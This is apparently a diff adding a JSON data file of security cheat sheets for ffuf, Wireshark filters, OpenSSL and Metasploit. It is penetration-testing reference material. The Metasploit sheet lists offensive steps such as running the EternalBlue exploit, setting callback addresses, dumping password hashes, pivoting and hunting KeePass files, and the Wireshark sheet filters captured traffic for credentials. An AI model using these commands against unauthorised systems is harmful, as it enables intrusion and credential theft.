+     },
+     {
+      "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -c",
+      "description": "Colorize the terminal output"
+     },
+     {
+      "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -p 0.1",
+      "description": "Pause 0.1 seconds between requests"
+     },
+     {
+      "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -rate 100",
+      "description": "Limit to 100 requests per second"
+     },
+     {
+      "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -timeout 10",
+      "description": "Drop requests slower than 10 seconds"
+     }
+    ]
+   }
+  ],
+  "slug": "ffuf-content-discovery",
+  "title": "Fuzzing with ffuf"
+ },
+ {
+  "description": "Wireshark display filters for HTTP, DNS, TLS, and TCP analysis, plus filters that surface credentials in captured traffic.",
+  "sections": [
+   {
+    "heading": "Filter Basics",
+    "rows": [
+     {
+      "command": "ip.addr == 10.10.10.5",
+      "description": "Traffic to or from one IP address"
+     },
+     {
+      "command": "ip.src == 10.10.10.5",
+      "description": "Only packets sent by that IP"
+     },
+     {
+      "command": "ip.dst == 10.10.10.5",
+      "description": "Only packets sent to that IP"
+     },
+     {
+      "command": "tcp.port == 80",
+      "description": "TCP traffic on port 80"
+     },
+     {
+      "command": "udp.port == 53",
+      "description": "UDP traffic on port 53"
+     },
+     {
+      "command": "frame contains \"password\"",
+      "description": "Any frame with that text inside"
+     }
+    ]
+   },
+   {
+    "heading": "HTTP",
+    "rows": [
+     {
+      "command": "http",
+      "description": "All HTTP traffic"
+     },
+     {
+      "command": "http.request.method == \"GET\"",
+      "description": "Only GET requests"
+     },
+     {
+      "command": "http.request.method == \"POST\"",
+      "description": "Only POST requests"
+     },
+     {
+      "command": "http.host == \"target.com\"",
+      "description": "Requests to one host only"
+     },
+     {
+      "command": "http.response.code == 200",
+      "description": "Successful HTTP responses"
+     },
+     {
+      "command": "http contains \"password\"",
+      "description": "HTTP packets mentioning password"
+     },
+     {
+      "command": "http.authbasic",
+      "description": "Basic authentication headers"
+     }
+    ]
+   },
+   {
+    "heading": "DNS",
+    "rows": [
+     {
+      "command": "dns",
+      "description": "All DNS traffic"
+     },
+     {
+      "command": "dns.qry.name == \"target.com\"",
+      "description": "Queries for one domain"
+     },
+     {
+      "command": "dns.qry.name contains \"target\"",
+      "description": "Queries matching a substring"
+     },
+     {
+      "command": "dns.flags.response == 0",
+      "description": "DNS queries only, no answers"
+     },
+     {
+      "command": "dns.flags.response == 1",
+      "description": "DNS answers only"
+     },
+     {
+      "command": "dns.resp.addr == 93.184.216.34",
+      "description": "Answers resolving to one IP"
+     }
+    ]
+   },
+   {
+    "heading": "TLS",
+    "rows": [
+     {
+      "command": "tls",
+      "description": "All TLS traffic"
+     },
+     {
+      "command": "tls.handshake.type == 1",
+      "description": "Client hello messages"
+     },
+     {
+      "command": "tls.handshake.extensions_server_name",
+      "description": "SNI hostnames inside handshakes"
+     },
+     {
+      "command": "tls.handshake.type == 11",
+      "description": "Certificate messages"
+     },
+     {
+      "command": "tls.record.version == 0x0303",
+      "description": "TLS 1.2 records"
+     },
+     {
+      "command": "x509sat.printableString",
+      "description": "Certificate subject strings"
+     }
+    ]
+   },
+   {
+    "heading": "TCP Analysis",
+    "rows": [
+     {
+      "command": "tcp.flags.syn == 1 && tcp.flags.ack == 0",
+      "description": "SYN packets starting connections"
+     },
+     {
+      "command": "tcp.flags.reset == 1",
+      "description": "RST packets killing connections"
+     },
+     {
+      "command": "tcp.stream eq 5",
+      "description": "Follow one TCP stream by index"
+     },
+     {
+      "command": "tcp.analysis.retransmission",
+      "description": "Retransmitted packets"
+     },
+     {
+      "command": "tcp.analysis.flags",
+      "description": "Packets Wireshark flagged as odd"
+     },
+     {
+      "command": "tcp.window_size == 0",
+      "description": "Zero window stalls"
+     }
+    ]
+   },
+   {
+    "heading": "Credential Hunting",
+    "rows": [
+     {
+      "command": "http.authbasic",
+      "description": "Basic auth credentials in headers"
+     },
+     {
+      "command": "ftp.request.command == \"USER\" || ftp.request.command == \"PASS\"",
+      "description": "FTP login attempts"
+     },
+     {
+      "command": "telnet.data",
+      "description": "Telnet session data with typed credentials"
+     },
+     {
+      "command": "http.request.method == \"POST\" && http contains \"pass\"",
+      "description": "Login form submissions"
+     },
+     {
+      "command": "data contains \"password\"",
+      "description": "Raw data with the word password"
+     },
+     {
+      "command": "kerberos",
+      "description": "Kerberos tickets and exchanges"
+     }
+    ]
+   }
+  ],
+  "slug": "wireshark-filters",
+  "title": "Wireshark Display Filters"
+ },
+ {
+  "description": "Practical OpenSSL commands for inspecting certificates, creating keys, probing TLS servers, encrypting files, and hashing.",
+  "sections": [
+   {
+    "heading": "Inspecting Certificates",
+    "rows": [
+     {
+      "command": "openssl x509 -in cert.pem -text -noout",
+      "description": "Show full certificate details"
+     },
+     {
+      "command": "openssl x509 -in cert.pem -dates -noout",
+      "description": "Show not-before and not-after dates"
+     },
+     {
+      "command": "openssl x509 -in cert.pem -issuer -noout",
+      "description": "Show the certificate issuer"
+     },
+     {
+      "command": "openssl x509 -in cert.pem -subject -noout",
+      "description": "Show the certificate subject"
+     },
+     {
+      "command": "openssl x509 -in cert.pem -fingerprint -sha256 -noout",
+      "description": "Show the SHA256 fingerprint"
+     },
+     {
+      "command": "openssl x509 -in cert.pem -ext subjectAltName -noout",
+      "description": "Show the subjectAltName entries"
+     },
+     {
+      "command": "openssl x509 -in cert.pem -modulus -noout | openssl md5",
+      "description": "Hash the certificate modulus"
+     }
+    ]
+   },
+   {
+    "heading": "Creating Keys and CSRs",
+    "rows": [
+     {
+      "command": "openssl genrsa -out key.pem 2048",
+      "description": "Generate a 2048-bit RSA key"
+     },
+     {
+      "command": "openssl req -new -newkey rsa:2048 -keyout key.pem -out req.csr",
+      "description": "Create a key and certificate signing request"
+     },
+     {
+      "command": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes",
+      "description": "Self-signed certificate in one step"
+     },
+     {
+      "command": "openssl rsa -in key.pem -check",
+      "description": "Verify a private key is valid"
+     },
+     {
+      "command": "openssl pkey -in key.pem -text -noout",
+      "description": "Show key parameters"
+     },
+     {
+      "command": "openssl req -in req.csr -text -noout",
+      "description": "Inspect a CSR before sending it"
+     }
+    ]
+   },
+   {
+    "heading": "Probing TLS Servers",
+    "rows": [
+     {
+      "command": "openssl s_client -connect target.com:443",
+      "description": "Open a TLS session manually"
+     },
+     {
+      "command": "openssl s_client -connect target.com:443 -servername target.com",
+      "description": "Send SNI to get the right certificate"
+     },
+     {
+      "command": "openssl s_client -connect target.com:443 -showcerts",
+      "description": "Print the full certificate chain"
+     },
+     {
+      "command": "openssl s_client -connect target.com:443 -tls1_2",
+      "description": "Force TLS 1.2"
+     },
+     {
+      "command": "openssl s_client -connect target.com:443 -cipher 'ECDHE-RSA-AES256-GCM-SHA384'",
+      "description": "Test one cipher suite"
+     },
+     {
+      "command": "echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -dates",
+      "description": "Grab the cert and check its expiry"
+     },
+     {
+      "command": "openssl s_client -connect target.com:443 -starttls smtp",
+      "description": "Upgrade an SMTP session to TLS"
+     }
+    ]
+   },
+   {
+    "heading": "Encrypting and Decrypting",
+    "rows": [
+     {
+      "command": "openssl enc -aes-256-cbc -salt -pbkdf2 -in file.txt -out file.enc",
+      "description": "Encrypt a file with AES-256"
+     },
+     {
+      "command": "openssl enc -d -aes-256-cbc -pbkdf2 -in file.enc -out file.txt",
+      "description": "Decrypt it back to plaintext"
+     },
+     {
+      "command": "openssl enc -base64 -in file.txt",
+      "description": "Base64 encode a file"
+     },
+     {
+      "command": "openssl enc -d -base64 -in file.b64 -out file.txt",
+      "description": "Base64 decode a file"
+     },
+     {
+      "command": "openssl pkeyutl -encrypt -pubin -inkey pub.pem -in secret.txt -out secret.enc",
+      "description": "RSA encrypt with a public key"
+     },
+     {
+      "command": "openssl pkeyutl -decrypt -inkey key.pem -in secret.enc -out secret.txt",
+      "description": "RSA decrypt with the private key"
+     }
+    ]
+   },
+   {
+    "heading": "Hashes and Randomness",
+    "rows": [
+     {
+      "command": "openssl dgst -sha256 file.txt",
+      "description": "SHA256 hash of a file"
+     },
+     {
+      "command": "openssl dgst -sha512 file.txt",
+      "description": "SHA512 hash of a file"
+     },
+     {
+      "command": "echo -n \"text\" | openssl dgst -sha256",
+      "description": "Hash a string without the newline"
+     },
+     {
+      "command": "openssl rand -hex 16",
+      "description": "Generate 16 random bytes as hex"
+     },
+     {
+      "command": "openssl rand -base64 32",
+      "description": "Generate 32 random bytes as Base64"
+     }
+    ]
+   }
+  ],
+  "slug": "openssl-practical",
+  "title": "OpenSSL Practical"
+ },
+ {
+  "description": "The essential Metasploit workflow: launching msfconsole, finding and configuring modules, running exploits, managing sessions, and Meterpreter basics.",
+  "sections": [
+   {
+    "heading": "Launching and Searching",
+    "rows": [
+     {
+      "command": "msfconsole",
+      "description": "Start the Metasploit console"
+     },
+     {
+      "command": "msfconsole -q",
+      "description": "Start quietly without the banner"
+     },
+     {
+      "command": "search eternalblue",
+      "description": "Find modules matching a keyword"
+     },
+     {
+      "command": "search type:exploit platform:windows smb",
+      "description": "Filter modules by type and platform"
+     },
+     {
+      "command": "info exploit/windows/smb/ms17_010_eternalblue",
+      "description": "Read a module description and targets"
+     },
+     {
+      "command": "show exploits",
+      "description": "List every loaded exploit module"
+     }
+    ]
+   },
+   {
+    "heading": "Using and Configuring",
+    "rows": [
+     {
+      "command": "use exploit/windows/smb/ms17_010_eternalblue",
+      "description": "Select a module to work with"
+     },
+     {
+      "command": "show options",
+      "description": "Display the settings you must fill in"
+     },
+     {
+      "command": "set RHOSTS 10.10.10.10",
+      "description": "Set the target host"
+     },
+     {
+      "command": "set RPORT 445",
+      "description": "Set the target port"
+     },
+     {
+      "command": "set LHOST 10.10.10.5",
+      "description": "Set your callback address"
+     },
+     {
+      "command": "set LPORT 4444",
+      "description": "Set your callback port"
+     },
+     {
+      "command": "unset RHOSTS",
+      "description": "Clear a setting back to empty"
+     }
+    ]
+   },
+   {
+    "heading": "Running Exploits",
+    "rows": [
+     {
+      "command": "run",
+      "description": "Launch the current module"
+     },
+     {
+      "command": "exploit",
+      "description": "Alias for run on exploit modules"
+     },
+     {
+      "command": "exploit -j",
+      "description": "Run the exploit as a background job"
+     },
+     {
+      "command": "check",
+      "description": "Test whether the target looks vulnerable"
+     },
+     {
+      "command": "back",
+      "description": "Leave the current module"
+     },
+     {
+      "command": "jobs",
+      "description": "List running background jobs"
+     }
+    ]
+   },
+   {
+    "heading": "Sessions",
+    "rows": [
+     {
+      "command": "sessions -l",
+      "description": "List all open sessions"
+     },
+     {
+      "command": "sessions -i 1",
+      "description": "Interact with session 1"
+     },
+     {
+      "command": "background",
+      "description": "Return to msfconsole and keep the session"
+     },
+     {
+      "command": "sessions -k 1",
+      "description": "Kill session 1"
+     },
+     {
+      "command": "sessions -K",
+      "description": "Kill every session"
+     },
+     {
+      "command": "route add 10.10.20.0 255.255.255.0 1",
+      "description": "Pivot traffic through session 1"
+     }
+    ]
+   },
+   {
+    "heading": "Meterpreter Essentials",
+    "rows": [
+     {
+      "command": "sysinfo",
+      "description": "Target OS and architecture"
+     },
+     {
+      "command": "getuid",
+      "description": "Current user on the target"
+     },
+     {
+      "command": "ps",
+      "description": "List running processes"
+     },
+     {
+      "command": "migrate 1234",
+      "description": "Move into another process by PID"
+     },
+     {
+      "command": "shell",
+      "description": "Drop to a system shell"
+     },
+     {
+      "command": "hashdump",
+      "description": "Dump local password hashes"
+     },
+     {
+      "command": "screenshot",
+      "description": "Capture the target screen"
+     }
+    ]
+   },
+   {
+    "heading": "File and Post Basics",
+    "rows": [
+     {
+      "command": "pwd",
+      "description": "Show the current remote directory"
+     },
+     {
+      "command": "ls",
+      "description": "List files in the remote directory"
+     },
+     {
+      "command": "cd C:\\Windows\\Temp",
+      "description": "Change the remote directory"
+     },
+     {
+      "command": "upload /tmp/x.exe C:\\Windows\\Temp\\x.exe",
+      "description": "Copy a file to the target"
+     },
+     {
+      "command": "download C:\\Windows\\Temp\\loot.txt /tmp/",
+      "description": "Copy a file from the target"
+     },
+     {
+      "command": "search -f *.kdbx",
+      "description": "Hunt for KeePass databases on disk"
+     }
+    ]
+   }
+  ],
+  "slug": "metasploit-basics",
+  "title": "Metasploit Basics"
+ }
+]
